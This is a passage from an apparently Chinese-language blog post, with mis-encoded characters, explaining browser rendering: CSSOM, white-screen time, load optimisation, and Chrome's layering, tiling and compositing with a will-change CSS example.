<span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;theme.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>geekbang com<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/14/k1RwdbiQVEAPlcJ.jpg" alt="Snipaste_2021-06-14_19-46-45.jpg"></p><p>é¦–å…ˆæ˜¯å‘èµ·ä¸»é¡µé¢çš„è¯·æ±‚ï¼Œè¿™ä¸ªå‘èµ·è¯·æ±‚æ–¹å¯èƒ½æ˜¯æ¸²æŸ“è¿›ç¨‹ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æµè§ˆå™¨è¿›ç¨‹ï¼Œå‘èµ·çš„è¯·æ±‚è¢«é€åˆ°ç½‘ç»œè¿›ç¨‹ä¸­å»æ‰§è¡Œã€‚ç½‘ç»œè¿›ç¨‹æ¥æ”¶åˆ°è¿”å›çš„ HTML æ•°æ®ä¹‹åï¼Œå°†å…¶å‘é€ç»™æ¸²æŸ“è¿›ç¨‹ï¼Œæ¸²æŸ“è¿›ç¨‹ä¼šè§£æ HTML æ•°æ®å¹¶æ„å»º DOMã€‚<strong>éœ€è¦ç‰¹åˆ«æ³¨æ„</strong>ï¼Œè¯·æ±‚ HTML æ•°æ®å’Œæ„å»º DOM ä¸­é—´æœ‰ä¸€æ®µç©ºé—²æ—¶é—´ï¼Œè¿™ä¸ªç©ºé—²æ—¶é—´æœ‰å¯èƒ½æˆä¸ºé¡µé¢æ¸²æŸ“çš„ç“¶é¢ˆã€‚</p><p>å½“æ¸²æŸ“è¿›ç¨‹æ¥æ”¶ HTML æ–‡ä»¶å­—èŠ‚æµæ—¶ï¼Œä¼šå…ˆå¼€å¯ä¸€ä¸ª<strong>é¢„è§£æçº¿ç¨‹</strong>ï¼Œå¦‚æœé‡åˆ° JavaScript æ–‡ä»¶æˆ–è€… CSS æ–‡ä»¶ï¼Œé‚£ä¹ˆé¢„è§£æçº¿ç¨‹ä¼šæå‰ä¸‹è½½è¿™äº›æ•°æ®ã€‚å¯¹äºä¸Šé¢çš„ä»£ç ï¼Œé¢„è§£æçº¿ç¨‹ä¼šè§£æå‡ºæ¥ä¸€ä¸ªå¤–éƒ¨çš„ theme.css æ–‡ä»¶ï¼Œå¹¶å‘èµ· theme.css çš„ä¸‹è½½ã€‚è¿™é‡Œä¹Ÿæœ‰ä¸€ä¸ªç©ºé—²æ—¶é—´<strong>éœ€è¦æ³¨æ„ä¸€ä¸‹</strong>ï¼Œå°±æ˜¯åœ¨ DOM æ„å»ºç»“æŸä¹‹åã€theme.css æ–‡ä»¶è¿˜æœªä¸‹è½½å®Œæˆçš„è¿™æ®µæ—¶é—´å†…ï¼Œæ¸²æŸ“æµæ°´çº¿æ— äº‹å¯åšï¼Œå› ä¸ºä¸‹ä¸€æ­¥æ˜¯åˆæˆå¸ƒå±€æ ‘ï¼Œè€Œåˆæˆå¸ƒå±€æ ‘éœ€è¦ CSSOM å’Œ DOMï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦ç­‰å¾… CSS åŠ è½½ç»“æŸå¹¶è§£ææˆ CSSOMã€‚</p><p><strong>é‚£æ¸²æŸ“æµæ°´çº¿ä¸ºä»€ä¹ˆéœ€è¦ CSSOM å‘¢ï¼Ÿ</strong></p><p>å’Œ HTML ä¸€æ ·ï¼Œæ¸²æŸ“å¼•æ“ä¹Ÿæ˜¯æ— æ³•ç›´æ¥ç†è§£ CSS æ–‡ä»¶å†…å®¹çš„ï¼Œæ‰€ä»¥éœ€è¦å°†å…¶è§£ææˆæ¸²æŸ“å¼•æ“èƒ½å¤Ÿç†è§£çš„ç»“æ„ï¼Œè¿™ä¸ªç»“æ„å°±æ˜¯ CSSOMã€‚å’Œ DOM ä¸€æ ·ï¼ŒCSSOM ä¹Ÿå…·æœ‰ä¸¤ä¸ªä½œç”¨ï¼Œ<strong>ç¬¬ä¸€ä¸ªæ˜¯æä¾›ç»™ JavaScript æ“ä½œæ ·å¼è¡¨çš„èƒ½åŠ›ï¼Œç¬¬äºŒä¸ªæ˜¯ä¸ºå¸ƒå±€æ ‘çš„åˆæˆæä¾›åŸºç¡€çš„æ ·å¼ä¿¡æ¯</strong>ã€‚è¿™ä¸ª CSSOM ä½“ç°åœ¨ DOM ä¸­å°±æ˜¯ <code> document.styleSheets</code>ã€‚</p><p>è‹¥åœ¨ä¹‹å‰ä»£ç åŸºç¡€ä¸Šï¼Œåˆåœ¨ body æ ‡ç­¾å†…éƒ¨åŠ äº†ä¸€ä¸ªç®€å•çš„ JavaScript ï¼š</p><p><img src="https://i.loli.net/2021/06/14/z2WU6qpEyVRbTMr.jpg" alt="Snipaste_2021-06-14_19-49-33.jpg"></p><p>è‹¥HTML æ–‡ä»¶ä¸­åŒ…å«äº† CSS çš„å¤–éƒ¨å¼•ç”¨å’Œ JavaScript å¤–éƒ¨æ–‡ä»¶ï¼š</p><p><img src="https://i.loli.net/2021/06/14/HtTJbBIjoe72VPQ.jpg" alt="Snipaste_2021-06-14_19-53-59.jpg"></p><p>åœ¨æ¥æ”¶åˆ° HTML æ•°æ®ä¹‹åçš„é¢„è§£æè¿‡ç¨‹ä¸­ï¼ŒHTML é¢„è§£æå™¨è¯†åˆ«å‡ºæ¥äº†æœ‰ CSS æ–‡ä»¶å’Œ JavaScript æ–‡ä»¶éœ€è¦ä¸‹è½½ï¼Œç„¶åå°±åŒæ—¶å‘èµ·è¿™ä¸¤ä¸ªæ–‡ä»¶çš„ä¸‹è½½è¯·æ±‚ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶çš„ä¸‹è½½è¿‡ç¨‹æ˜¯é‡å çš„ï¼Œæ‰€ä»¥ä¸‹è½½æ—¶é—´æŒ‰ç…§æœ€ä¹…çš„é‚£ä¸ªæ–‡ä»¶æ¥ç®—ã€‚</p><p>ä¸ç®¡ CSS æ–‡ä»¶å’Œ JavaScript æ–‡ä»¶è°å…ˆåˆ°è¾¾ï¼Œéƒ½è¦å…ˆç­‰åˆ° CSS æ–‡ä»¶ä¸‹è½½å®Œæˆå¹¶ç”Ÿæˆ CSSOMï¼Œç„¶åå†æ‰§è¡Œ JavaScript è„šæœ¬ï¼Œæœ€åå†ç»§ç»­æ„å»º DOMï¼Œæ„å»ºå¸ƒå±€æ ‘ï¼Œç»˜åˆ¶é¡µé¢ã€‚</p><h3 id="å½±å“é¡µé¢å±•ç¤ºçš„å› ç´ ä»¥åŠä¼˜åŒ–ç­–ç•¥"><a href="#å½±å“é¡µé¢å±•ç¤ºçš„å› ç´ ä»¥åŠä¼˜åŒ–ç­–ç•¥" class="headerlink" title="å½±å“é¡µé¢å±•ç¤ºçš„å› ç´ ä»¥åŠä¼˜åŒ–ç­–ç•¥"></a>å½±å“é¡µé¢å±•ç¤ºçš„å› ç´ ä»¥åŠä¼˜åŒ–ç­–ç•¥</h3><p>æ¸²æŸ“æµæ°´çº¿å½±å“åˆ°äº†é¦–æ¬¡é¡µé¢å±•ç¤ºçš„é€Ÿåº¦ï¼Œè€Œé¦–æ¬¡é¡µé¢å±•ç¤ºçš„é€Ÿåº¦åˆç›´æ¥å½±å“åˆ°äº†ç”¨æˆ·ä½“éªŒã€‚</p><p>ä»å‘èµ· URL è¯·æ±‚å¼€å§‹ï¼Œåˆ°é¦–æ¬¡æ˜¾ç¤ºé¡µé¢çš„å†…å®¹ï¼Œåœ¨è§†è§‰ä¸Šç»å†çš„ä¸‰ä¸ªé˜¶æ®µï¼š</p><ul><li>ç¬¬ä¸€ä¸ªé˜¶æ®µï¼Œç­‰è¯·æ±‚å‘å‡ºå»ä¹‹åï¼Œåˆ°æäº¤æ•°æ®é˜¶æ®µï¼Œè¿™æ—¶é¡µé¢å±•ç¤ºå‡ºæ¥çš„è¿˜æ˜¯ä¹‹å‰é¡µé¢çš„å†…å®¹ã€‚</li><li>ç¬¬äºŒä¸ªé˜¶æ®µï¼Œæäº¤æ•°æ®ä¹‹åæ¸²æŸ“è¿›ç¨‹ä¼šåˆ›å»ºä¸€ä¸ªç©ºç™½é¡µé¢ï¼Œé€šå¸¸æŠŠè¿™æ®µæ—¶é—´ç§°ä¸º<strong>è§£æç™½å±</strong>ï¼Œå¹¶ç­‰å¾… CSS æ–‡ä»¶å’Œ JavaScript æ–‡ä»¶çš„åŠ è½½å®Œæˆï¼Œç”Ÿæˆ CSSOM å’Œ DOMï¼Œç„¶ååˆæˆå¸ƒå±€æ ‘ï¼Œæœ€åè¿˜è¦ç»è¿‡ä¸€ç³»åˆ—çš„æ­¥éª¤å‡†å¤‡é¦–æ¬¡æ¸²æŸ“ã€‚</li><li>ç¬¬ä¸‰ä¸ªé˜¶æ®µï¼Œç­‰é¦–æ¬¡æ¸²æŸ“å®Œæˆä¹‹åï¼Œå°±å¼€å§‹è¿›å…¥å®Œæ•´é¡µé¢çš„ç”Ÿæˆé˜¶æ®µäº†ï¼Œç„¶åé¡µé¢ä¼šä¸€ç‚¹ç‚¹è¢«ç»˜åˆ¶å‡ºæ¥ã€‚</li></ul><p>å½±å“ç¬¬ä¸€ä¸ªé˜¶æ®µçš„å› ç´ ä¸»è¦æ˜¯ç½‘ç»œæˆ–è€…æ˜¯æœåŠ¡å™¨å¤„ç†ï¼›ç¬¬äºŒä¸ªé˜¶æ®µçš„ä¸»è¦é—®é¢˜æ˜¯ç™½å±æ—¶é—´ï¼Œå¦‚æœç™½å±æ—¶é—´è¿‡ä¹…ï¼Œå°±ä¼šå½±å“åˆ°ç”¨æˆ·ä½“éªŒã€‚</p><p>é€šå¸¸æƒ…å†µä¸‹çš„ç“¶é¢ˆä¸»è¦ä½“ç°åœ¨<strong>ä¸‹è½½ CSS æ–‡ä»¶ã€ä¸‹è½½ JavaScript æ–‡ä»¶å’Œæ‰§è¡Œ JavaScript</strong>ã€‚æ‰€ä»¥è¦æƒ³ç¼©çŸ­ç™½å±æ—¶é•¿ï¼Œå¯ä»¥æœ‰ä»¥ä¸‹ç­–ç•¥ï¼š</p><ul><li>é€šè¿‡å†…è” JavaScriptã€å†…è” CSS æ¥ç§»é™¤è¿™ä¸¤ç§ç±»å‹çš„æ–‡ä»¶ä¸‹è½½ï¼Œè¿™æ ·è·å–åˆ° HTML æ–‡ä»¶ä¹‹åå°±å¯ä»¥ç›´æ¥å¼€å§‹æ¸²æŸ“æµç¨‹äº†ã€‚</li><li>ä½†å¹¶ä¸æ˜¯æ‰€æœ‰çš„åœºåˆéƒ½é€‚åˆå†…è”ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥å°½é‡å‡å°‘æ–‡ä»¶å¤§å°ï¼Œæ¯”å¦‚é€šè¿‡ webpack ç­‰å·¥å…·ç§»é™¤ä¸€äº›ä¸å¿…è¦çš„æ³¨é‡Šï¼Œå¹¶å‹ç¼© JavaScript æ–‡ä»¶ã€‚</li><li>è¿˜å¯ä»¥å°†ä¸€äº›ä¸éœ€è¦åœ¨è§£æ HTML é˜¶æ®µä½¿ç”¨çš„ JavaScript æ ‡è®°ä¸Š sync æˆ–è€… deferã€‚</li><li>å¯¹äºå¤§çš„ CSS æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡åª’ä½“æŸ¥è¯¢å±æ€§ï¼Œå°†å…¶æ‹†åˆ†ä¸ºå¤šä¸ªä¸åŒç”¨é€”çš„ CSS æ–‡ä»¶ï¼Œè¿™æ ·åªæœ‰åœ¨ç‰¹å®šçš„åœºæ™¯ä¸‹æ‰ä¼šåŠ è½½ç‰¹å®šçš„ CSS æ–‡ä»¶ã€‚</li></ul><h2 id="åˆ†å±‚å’Œåˆæˆæœºåˆ¶"><a href="#åˆ†å±‚å’Œåˆæˆæœºåˆ¶" class="headerlink" title="åˆ†å±‚å’Œåˆæˆæœºåˆ¶"></a>åˆ†å±‚å’Œåˆæˆæœºåˆ¶</h2><h3 id="æ˜¾ç¤ºå™¨æ˜¯æ€ä¹ˆæ˜¾ç¤ºå›¾åƒçš„ï¼Ÿ"><a href="#æ˜¾ç¤ºå™¨æ˜¯æ€ä¹ˆæ˜¾ç¤ºå›¾åƒçš„ï¼Ÿ" class="headerlink" title="æ˜¾ç¤ºå™¨æ˜¯æ€ä¹ˆæ˜¾ç¤ºå›¾åƒçš„ï¼Ÿ"></a>æ˜¾ç¤ºå™¨æ˜¯æ€ä¹ˆæ˜¾ç¤ºå›¾åƒçš„ï¼Ÿ</h3><p>æ¯ä¸ªæ˜¾ç¤ºå™¨éƒ½æœ‰å›ºå®šçš„åˆ·æ–°é¢‘ç‡ï¼Œé€šå¸¸æ˜¯ 60HZï¼Œä¹Ÿå°±æ˜¯æ¯ç§’æ›´æ–° 60 å¼ å›¾ç‰‡ï¼Œæ›´æ–°çš„å›¾ç‰‡éƒ½æ¥è‡ªäºæ˜¾å¡ä¸­ä¸€ä¸ªå«<strong>å‰ç¼“å†²åŒº</strong>çš„åœ°æ–¹ï¼Œæ˜¾ç¤ºå™¨æ‰€åšçš„ä»»åŠ¡å¾ˆç®€å•ï¼Œå°±æ˜¯æ¯ç§’å›ºå®šè¯»å– 60 æ¬¡å‰ç¼“å†²åŒºä¸­çš„å›¾åƒï¼Œå¹¶å°†è¯»å–çš„å›¾åƒæ˜¾ç¤ºåˆ°æ˜¾ç¤ºå™¨ä¸Šã€‚</p><p>æ˜¾å¡çš„èŒè´£å°±æ˜¯åˆæˆæ–°çš„å›¾åƒï¼Œå¹¶å°†å›¾åƒä¿å­˜åˆ°<strong>åç¼“å†²åŒº</strong>ä¸­ï¼Œä¸€æ—¦æ˜¾å¡æŠŠåˆæˆçš„å›¾åƒå†™åˆ°åç¼“å†²åŒºï¼Œç³»ç»Ÿå°±ä¼šè®©åç¼“å†²åŒºå’Œå‰ç¼“å†²åŒºäº’æ¢ï¼Œè¿™æ ·å°±èƒ½ä¿è¯æ˜¾ç¤ºå™¨èƒ½è¯»å–åˆ°æœ€æ–°æ˜¾å¡åˆæˆçš„å›¾åƒã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œæ˜¾å¡çš„æ›´æ–°é¢‘ç‡å’Œæ˜¾ç¤ºå™¨çš„åˆ·æ–°é¢‘ç‡æ˜¯ä¸€è‡´çš„ã€‚ä½†æœ‰æ—¶å€™ï¼Œåœ¨ä¸€äº›å¤æ‚çš„åœºæ™¯ä¸­ï¼Œæ˜¾å¡å¤„ç†ä¸€å¼ å›¾ç‰‡çš„é€Ÿåº¦ä¼šå˜æ…¢ï¼Œè¿™æ ·å°±ä¼šé€ æˆè§†è§‰ä¸Šçš„å¡é¡¿ã€‚</p><h3 id="å¸§-VS-å¸§ç‡"><a href="#å¸§-VS-å¸§ç‡" class="headerlink" title="å¸§ VS å¸§ç‡"></a>å¸§ VS å¸§ç‡</h3><p>å½“é€šè¿‡æ»šåŠ¨æ¡æ»šåŠ¨é¡µé¢ï¼Œæˆ–è€…é€šè¿‡æ‰‹åŠ¿ç¼©æ”¾é¡µé¢æ—¶ï¼Œå±å¹•ä¸Šå°±ä¼šäº§ç”ŸåŠ¨ç”»çš„æ•ˆæœã€‚ä¹‹æ‰€ä»¥èƒ½æ„Ÿè§‰åˆ°æœ‰åŠ¨ç”»çš„æ•ˆæœï¼Œæ˜¯å› ä¸ºåœ¨æ»šåŠ¨æˆ–è€…ç¼©æ”¾æ“ä½œæ—¶ï¼Œæ¸²æŸ“å¼•æ“ä¼šé€šè¿‡æ¸²æŸ“æµæ°´çº¿ç”Ÿæˆæ–°çš„å›¾ç‰‡ï¼Œå¹¶å‘é€åˆ°æ˜¾å¡çš„åç¼“å†²åŒºã€‚</p><p>å¤§å¤šæ•°è®¾å¤‡å±å¹•çš„æ›´æ–°é¢‘ç‡æ˜¯ 60 æ¬¡ / ç§’ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æ­£å¸¸æƒ…å†µä¸‹è¦å®ç°æµç•…çš„åŠ¨ç”»æ•ˆæœï¼Œæ¸²æŸ“å¼•æ“éœ€è¦æ¯ç§’æ›´æ–° 60 å¼ å›¾ç‰‡åˆ°æ˜¾å¡çš„åç¼“å†²åŒºã€‚</p><p>æˆ‘ä»¬æŠŠæ¸²æŸ“æµæ°´çº¿ç”Ÿæˆçš„æ¯ä¸€å‰¯å›¾ç‰‡ç§°ä¸ºä¸€å¸§ï¼ŒæŠŠæ¸²æŸ“æµæ°´çº¿æ¯ç§’æ›´æ–°äº†å¤šå°‘å¸§ç§°ä¸ºå¸§ç‡ï¼Œæ¯”å¦‚æ»šåŠ¨è¿‡ç¨‹ä¸­ 1 ç§’æ›´æ–°äº† 60 å¸§ï¼Œé‚£ä¹ˆå¸§ç‡å°±æ˜¯ 60Hzï¼ˆæˆ–è€… 60FPSï¼‰ã€‚</p><p>ç”±äºç”¨æˆ·å¾ˆå®¹æ˜“è§‚å¯Ÿåˆ°é‚£äº›ä¸¢å¤±çš„å¸§ï¼Œå¦‚æœåœ¨ä¸€æ¬¡åŠ¨ç”»è¿‡ç¨‹ä¸­ï¼Œæ¸²æŸ“å¼•æ“ç”ŸæˆæŸäº›å¸§çš„æ—¶é—´è¿‡ä¹…ï¼Œé‚£ä¹ˆç”¨æˆ·å°±ä¼šæ„Ÿå—åˆ°å¡é¡¿ï¼Œè¿™ä¼šç»™ç”¨æˆ·é€ æˆéå¸¸ä¸å¥½çš„å°è±¡ã€‚</p><p>è¦è§£å†³å¡é¡¿é—®é¢˜ï¼Œå°±è¦è§£å†³æ¯å¸§ç”Ÿæˆæ—¶é—´è¿‡ä¹…çš„é—®é¢˜ï¼Œä¸ºæ­¤ Chrome å¯¹æµè§ˆå™¨æ¸²æŸ“æ–¹å¼åšäº†å¤§é‡çš„å·¥ä½œï¼Œå…¶ä¸­æœ€å“æœ‰æˆæ•ˆçš„ç­–ç•¥å°±æ˜¯å¼•å…¥äº†åˆ†å±‚å’Œåˆæˆæœºåˆ¶ã€‚</p><h3 id="å¦‚ä½•ç”Ÿæˆä¸€å¸§å›¾åƒ"><a href="#å¦‚ä½•ç”Ÿæˆä¸€å¸§å›¾åƒ" class="headerlink" title="å¦‚ä½•ç”Ÿæˆä¸€å¸§å›¾åƒ"></a>å¦‚ä½•ç”Ÿæˆä¸€å¸§å›¾åƒ</h3><p>å…³äºå…¶ä¸­ä»»æ„ä¸€å¸§çš„ç”Ÿæˆæ–¹å¼ï¼Œæœ‰<strong>é‡æ’ã€é‡ç»˜</strong>å’Œ<strong>åˆæˆ</strong>ä¸‰ç§æ–¹å¼ï¼ˆå…·ä½“è§ç¬”è®°ï¼ˆä¸€ï¼‰æ¸²æŸ“æµç¨‹ï¼‰ã€‚Chrome ä¸­çš„åˆæˆæŠ€æœ¯ï¼Œå¯ä»¥ç”¨ä¸‰ä¸ªè¯æ¥æ¦‚æ‹¬æ€»ç»“ï¼š<strong>åˆ†å±‚ã€åˆ†å—</strong>å’Œ<strong>åˆæˆ</strong>ã€‚</p><h4 id="åˆ†å±‚å’Œåˆæˆ"><a href="#åˆ†å±‚å’Œåˆæˆ" class="headerlink" title="åˆ†å±‚å’Œåˆæˆ"></a>åˆ†å±‚å’Œåˆæˆ</h4><p>æŠŠä¸€å¼ ç½‘é¡µæƒ³è±¡æˆæ˜¯ç”±å¾ˆå¤šä¸ªå›¾ç‰‡å åŠ åœ¨ä¸€èµ·çš„ï¼Œæ¯ä¸ªå›¾ç‰‡å°±å¯¹åº”ä¸€ä¸ªå›¾å±‚ï¼ŒChrome åˆæˆå™¨æœ€ç»ˆå°†è¿™äº›å›¾å±‚åˆæˆäº†ç”¨äºæ˜¾ç¤ºé¡µé¢çš„å›¾ç‰‡ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå°†ç´ æåˆ†è§£ä¸ºå¤šä¸ªå›¾å±‚çš„æ“ä½œå°±ç§°ä¸º<strong>åˆ†å±‚</strong>ï¼Œæœ€åå°†è¿™äº›å›¾å±‚åˆå¹¶åˆ°ä¸€èµ·çš„æ“ä½œå°±ç§°ä¸º<strong>åˆæˆ</strong>ã€‚æ‰€ä»¥ï¼Œåˆ†å±‚å’Œåˆæˆé€šå¸¸æ˜¯ä¸€èµ·ä½¿ç”¨çš„ã€‚</p><h4 id="Chrome-å¦‚ä½•å®ç°"><a href="#Chrome-å¦‚ä½•å®ç°" class="headerlink" title="Chrome å¦‚ä½•å®ç°"></a><strong>Chrome å¦‚ä½•å®ç°</strong></h4><p>åœ¨ Chrome çš„æ¸²æŸ“æµæ°´çº¿ä¸­ï¼Œ<strong>åˆ†å±‚ä½“ç°åœ¨ç”Ÿæˆå¸ƒå±€æ ‘ä¹‹å</strong>ï¼Œæ¸²æŸ“å¼•æ“ä¼šæ ¹æ®å¸ƒå±€æ ‘çš„ç‰¹ç‚¹å°†å…¶è½¬æ¢ä¸ºå±‚æ ‘ï¼ˆLayer Treeï¼‰ï¼Œå±‚æ ‘æ˜¯æ¸²æŸ“æµæ°´çº¿åç»­æµç¨‹çš„åŸºç¡€ç»“æ„ã€‚</p><p>å±‚æ ‘ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½å¯¹åº”ç€ä¸€ä¸ªå›¾å±‚ï¼Œä¸‹ä¸€æ­¥çš„ç»˜åˆ¶é˜¶æ®µå°±ä¾èµ–äºå±‚æ ‘ä¸­çš„èŠ‚ç‚¹ã€‚ä½†ç»˜åˆ¶é˜¶æ®µå…¶å®å¹¶ä¸æ˜¯çœŸæ­£åœ°ç»˜å‡ºå›¾ç‰‡ï¼Œè€Œæ˜¯å°†ç»˜åˆ¶æŒ‡ä»¤ç»„åˆæˆä¸€ä¸ªåˆ—è¡¨ï¼Œæ¯”å¦‚ä¸€ä¸ªå›¾å±‚è¦è®¾ç½®çš„èƒŒæ™¯ä¸ºé»‘è‰²ï¼Œå¹¶ä¸”è¿˜è¦åœ¨ä¸­é—´ç”»ä¸€ä¸ªåœ†å½¢ï¼Œé‚£ä¹ˆç»˜åˆ¶è¿‡ç¨‹ä¼šç”Ÿæˆ<code>|Paint BackGroundColor:Black | Paint Circle|</code>è¿™æ ·çš„ç»˜åˆ¶æŒ‡ä»¤åˆ—è¡¨ï¼Œç»˜åˆ¶è¿‡ç¨‹å°±å®Œæˆäº†ã€‚</p><p>æœ‰äº†ç»˜åˆ¶åˆ—è¡¨ä¹‹åï¼Œå°±éœ€è¦è¿›å…¥å…‰æ …åŒ–é˜¶æ®µäº†ï¼Œå…‰æ …åŒ–å°±æ˜¯æŒ‰ç…§ç»˜åˆ¶åˆ—è¡¨ä¸­çš„æŒ‡ä»¤ç”Ÿæˆå›¾ç‰‡ã€‚æ¯ä¸€ä¸ªå›¾å±‚éƒ½å¯¹åº”ä¸€å¼ å›¾ç‰‡ï¼Œåˆæˆçº¿ç¨‹æœ‰äº†è¿™äº›å›¾ç‰‡ä¹‹åï¼Œä¼šå°†è¿™äº›å›¾ç‰‡åˆæˆä¸ºâ€œä¸€å¼ â€å›¾ç‰‡ï¼Œå¹¶æœ€ç»ˆå°†ç”Ÿæˆçš„å›¾ç‰‡å‘é€åˆ°åç¼“å†²åŒºã€‚è¿™å°±æ˜¯ä¸€ä¸ªå¤§è‡´çš„åˆ†å±‚ã€åˆæˆæµç¨‹ã€‚</p><p><strong>éœ€è¦é‡ç‚¹å…³æ³¨çš„æ˜¯ï¼Œåˆæˆæ“ä½œæ˜¯åœ¨åˆæˆçº¿ç¨‹ä¸Šå®Œæˆçš„ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€åœ¨æ‰§è¡Œåˆæˆæ“ä½œæ—¶ï¼Œæ˜¯ä¸ä¼šå½±å“åˆ°ä¸»çº¿ç¨‹æ‰§è¡Œçš„</strong>ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆç»å¸¸ä¸»çº¿ç¨‹å¡ä½äº†ï¼Œä½†æ˜¯ CSS åŠ¨ç”»ä¾ç„¶èƒ½æ‰§è¡Œçš„åŸå› ã€‚</p><h4 id="åˆ†å—"><a href="#åˆ†å—" class="headerlink" title="åˆ†å—"></a>åˆ†å—</h4><p>å¦‚æœè¯´åˆ†å±‚æ˜¯ä»<strong>å®è§‚</strong>ä¸Šæå‡äº†æ¸²æŸ“æ•ˆç‡ï¼Œé‚£ä¹ˆåˆ†å—åˆ™æ˜¯ä»<strong>å¾®è§‚</strong>å±‚é¢æå‡äº†æ¸²æŸ“æ•ˆç‡ã€‚</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œé¡µé¢çš„å†…å®¹éƒ½è¦æ¯”å±å¹•å¤§å¾—å¤šï¼Œæ˜¾ç¤ºä¸€ä¸ªé¡µé¢æ—¶ï¼Œå¦‚æœç­‰å¾…æ‰€æœ‰çš„å›¾å±‚éƒ½ç”Ÿæˆå®Œæ¯•ï¼Œå†è¿›è¡Œåˆæˆçš„è¯ï¼Œä¼šäº§ç”Ÿä¸€äº›ä¸å¿…è¦çš„å¼€é”€ï¼Œä¹Ÿä¼šè®©åˆæˆå›¾ç‰‡çš„æ—¶é—´å˜å¾—æ›´ä¹…ã€‚</p><p>å› æ­¤ï¼Œåˆæˆçº¿ç¨‹ä¼šå°†æ¯ä¸ªå›¾å±‚åˆ†å‰²ä¸ºå¤§å°å›ºå®šçš„å›¾å—ï¼Œç„¶åä¼˜å…ˆç»˜åˆ¶é è¿‘è§†å£çš„å›¾å—ï¼Œè¿™æ ·å°±å¯ä»¥å¤§å¤§åŠ é€Ÿé¡µé¢çš„æ˜¾ç¤ºé€Ÿåº¦ã€‚ä¸è¿‡æœ‰æ—¶å€™ï¼Œ å³ä½¿åªç»˜åˆ¶é‚£äº›ä¼˜å…ˆçº§æœ€é«˜çš„å›¾å—ï¼Œä¹Ÿè¦è€—è´¹ä¸å°‘çš„æ—¶é—´ï¼Œå› ä¸ºæ¶‰åŠåˆ°ä¸€ä¸ªå¾ˆå…³é”®çš„å› ç´ â€”â€”<strong>çº¹ç†ä¸Šä¼ </strong>ï¼Œè¿™æ˜¯å› ä¸ºä»è®¡ç®—æœºå†…å­˜ä¸Šä¼ åˆ° GPU å†…å­˜çš„æ“ä½œä¼šæ¯”è¾ƒæ…¢ã€‚</p><p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒChrome åˆé‡‡å–äº†ä¸€ä¸ªç­–ç•¥ï¼š<strong>åœ¨é¦–æ¬¡åˆæˆå›¾å—çš„æ—¶å€™ä½¿ç”¨ä¸€ä¸ªä½åˆ†è¾¨ç‡çš„å›¾ç‰‡</strong>ã€‚æ¯”å¦‚å¯ä»¥æ˜¯æ­£å¸¸åˆ†è¾¨ç‡çš„ä¸€åŠï¼Œåˆ†è¾¨ç‡å‡å°‘ä¸€åŠï¼Œçº¹ç†å°±å‡å°‘äº†å››åˆ†ä¹‹ä¸‰ã€‚åœ¨é¦–æ¬¡æ˜¾ç¤ºé¡µé¢å†…å®¹çš„æ—¶å€™ï¼Œå°†è¿™ä¸ªä½åˆ†è¾¨ç‡çš„å›¾ç‰‡æ˜¾ç¤ºå‡ºæ¥ï¼Œç„¶ååˆæˆå™¨ç»§ç»­ç»˜åˆ¶æ­£å¸¸æ¯”ä¾‹çš„ç½‘é¡µå†…å®¹ï¼Œå½“æ­£å¸¸æ¯”ä¾‹çš„ç½‘é¡µå†…å®¹ç»˜åˆ¶å®Œæˆåï¼Œå†æ›¿æ¢æ‰å½“å‰æ˜¾ç¤ºçš„ä½åˆ†è¾¨ç‡å†…å®¹ã€‚</p><h3 id="å¦‚ä½•åˆ©ç”¨åˆ†å±‚æŠ€æœ¯ä¼˜åŒ–ä»£ç "><a href="#å¦‚ä½•åˆ©ç”¨åˆ†å±‚æŠ€æœ¯ä¼˜åŒ–ä»£ç " class="headerlink" title="å¦‚ä½•åˆ©ç”¨åˆ†å±‚æŠ€æœ¯ä¼˜åŒ–ä»£ç "></a>å¦‚ä½•åˆ©ç”¨åˆ†å±‚æŠ€æœ¯ä¼˜åŒ–ä»£ç </h3><p>è‹¥ç»å¸¸éœ€è¦å¯¹æŸä¸ªå…ƒç´ åšå‡ ä½•å½¢çŠ¶å˜æ¢ã€é€æ˜åº¦å˜æ¢æˆ–è€…ä¸€äº›ç¼©æ”¾æ“ä½œï¼Œå¦‚æœä½¿ç”¨ JavaScript æ¥å†™è¿™äº›æ•ˆæœï¼Œä¼šç‰µæ¶‰åˆ°æ•´ä¸ªæ¸²æŸ“æµæ°´çº¿ï¼Œæ‰€ä»¥ JavaScript çš„ç»˜åˆ¶æ•ˆç‡ä¼šéå¸¸ä½ä¸‹ã€‚</p><p>è¿™æ—¶å¯ä»¥ä½¿ç”¨ will-change æ¥å‘Šè¯‰æ¸²æŸ“å¼•æ“ä½ ä¼šå¯¹è¯¥å…ƒç´ åšä¸€äº›ç‰¹æ•ˆå˜æ¢ï¼ŒCSS ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">will-change: transform, opacity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å°±æ˜¯æå‰å‘Šè¯‰æ¸²æŸ“å¼•æ“ box å…ƒç´ å°†è¦åšå‡ 